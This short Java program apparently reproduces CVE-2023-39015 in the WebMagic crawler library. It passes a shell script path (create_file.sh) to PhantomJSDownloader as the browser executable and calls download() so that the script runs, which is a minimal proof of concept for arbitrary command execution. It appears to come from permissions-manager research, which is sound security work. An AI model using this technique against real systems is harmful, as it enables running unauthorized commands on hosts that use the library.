package com.anonuser;

import us.codecraft.webmagic.Request;
import us.codecraft.webmagic.downloader.PhantomJSDownloader;

public class WebMagic_CVE_2023_39015 {

    public static void main(String[] args) {
        System.out.println("Recreating CVE-2023-39015");
        PhantomJSDownloader downloader = new PhantomJSDownloader("/home/pamusuo/research/permissions-manager/exploit-apps/files/create_file.sh", "");
        Request request = new Request();
        downloader.download(request, null);
    }
}
